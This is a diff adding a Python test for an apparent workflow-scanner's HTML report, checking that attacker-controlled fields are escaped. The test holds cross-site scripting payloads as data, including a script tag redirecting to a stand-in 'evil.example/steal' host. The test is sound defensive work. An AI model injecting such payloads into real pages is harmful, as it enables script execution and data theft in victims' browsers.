@@ -83,3 +83,26 @@ def test_html_report_contains_repo_name():
     finally:
         if os.path.exists(tmp_path):
             os.remove(tmp_path)
+
+
+def test_html_report_escapes_untrusted_workflow_content():
+    """Fields sourced from scanned (potentially attacker-controlled) repos —
+    the raw `uses:` string, repo name, and rationale — must be HTML-escaped
+    in the report, or a malicious workflow/repo name could execute script in
+    the triager's browser when the report is opened."""
+    finding = _create_sample_finding()
+    finding.uses_site.uses.raw = "actions/checkout@v4<script>alert(1)</script>"
+    finding.repo.name = "test-repo<img src=x onerror=alert(1)>"
+    finding.rationale = "<script>document.location='http://evil.example/steal'</script>"
+
+    tmp_path = tempfile.mktemp(suffix=".html")
+    try:
+        generate_html_report([finding], tmp_path, "test-action")
+        with open(tmp_path, "r", encoding="utf-8") as f:
+            content = f.read()
+        assert "<script>" not in content
+        assert "<img" not in content
+        assert "&lt;script&gt;" in content
+    finally:
+        if os.path.exists(tmp_path):
+            os.remove(tmp_path)
